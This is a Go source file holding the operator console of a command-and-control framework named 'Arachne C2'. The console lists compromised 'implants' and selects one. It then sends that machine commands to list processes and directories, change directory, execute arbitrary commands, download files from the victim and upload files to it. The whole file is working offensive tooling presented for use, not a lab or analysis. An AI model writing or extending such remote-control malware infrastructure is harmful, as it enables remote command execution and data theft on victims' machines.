package core

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"
)

func (o *Operator) RunCLI() {
	reader := bufio.NewReader(os.Stdin)
	var selected *ImplantRecord

	fmt.Println("Arachne C2 — interactive console")
	fmt.Println("Commands: list, select <idx>, ps, ls <path>, exec <cmd> [args...], help, exit")
	fmt.Println()

	for {
		if selected != nil {
			fmt.Printf("arachne[%s@%s]> ", selected.Name, selected.Hostname)
		} else {
			fmt.Printf("arachne> ")
		}

		line, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		cmd := parts[0]
		args := parts[1:]

		switch cmd {
		case "exit", "quit":
			return

		case "help":
			fmt.Println("  list              — show registered implants")
			fmt.Println("  select <idx>      — select implant by index")
			fmt.Println("  ps                — list processes on selected implant")
			fmt.Println("  ls <path>         — list directory")
			fmt.Println("  cd <path>         — change directory")
			fmt.Println("  pwd               — print working directory")
			fmt.Println("  exec <cmd> [args] — execute command (with output)")
			fmt.Println("  download <path>   — download file from implant")
			fmt.Println("  upload <src> <dst> — upload file to implant")
			fmt.Println("  help              — this help")
			fmt.Println("  exit              — quit")

		case "list":
			implants := o.ListImplants()
			if len(implants) == 0 {
				fmt.Println("no implants registered")
				continue
			}
			for i, rec := range implants {
				ago := time.Since(rec.LastCheckin).Round(time.Second)
				fmt.Printf("  %d: %s@%s [%s/%s] last=%s peer=%s\n",
					i, rec.Name, rec.Hostname, rec.OS, rec.Arch, ago, shortenStr(rec.PeerID, 20))
			}

		case "select":
			if len(args) == 0 {
				fmt.Println("usage: select <idx>")
				continue
			}
			idx, err := strconv.Atoi(args[0])
			if err != nil {
				fmt.Printf("bad index: %v\n", err)
				continue
			}
			implants := o.ListImplants()
			if idx < 0 || idx >= len(implants) {
				fmt.Println("index out of range")
				continue
			}
			selected = implants[idx]
			fmt.Printf("selected %s@%s (%s)\n", selected.Name, selected.Hostname, selected.PeerID)

		case "ps":
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if err := o.Ps(selected.PeerID); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("command sent")
			}

		case "ls":
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			path := "."
			if len(args) > 0 {
				path = args[0]
			}
			if err := o.Ls(selected.PeerID, path); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("command sent")
			}

		case "cd":
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			path := "."
			if len(args) > 0 {
				path = args[0]
			}
			if err := o.Cd(selected.PeerID, path); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("command sent")
			}

		case "pwd":
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if err := o.Pwd(selected.PeerID); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("command sent")
			}

		case "download":
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if len(args) == 0 {
				fmt.Println("usage: download <path>")
				continue
			}
			if err := o.Download(selected.PeerID, args[0]); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("download command sent")
			}

		case "upload":
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if len(args) < 2 {
				fmt.Println("usage: upload <src> <dst>")
				continue
			}
			data, err := os.ReadFile(args[0])
			if err != nil {
				fmt.Printf("read %s: %v\n", args[0], err)
				continue
			}
			if err := o.Upload(selected.PeerID, args[1], data); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Printf("uploaded %d bytes to %s\n", len(data), args[1])
			}

		case "exec", "execute":
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if len(args) == 0 {
				fmt.Println("usage: exec <cmd> [args...]")
				continue
			}
			if err := o.Execute(selected.PeerID, args[0], args[1:]); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("command sent")
			}

		default:
			fmt.Printf("unknown command: %s (try 'help')\n", cmd)
		}
	}
}

func shortenStr(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}
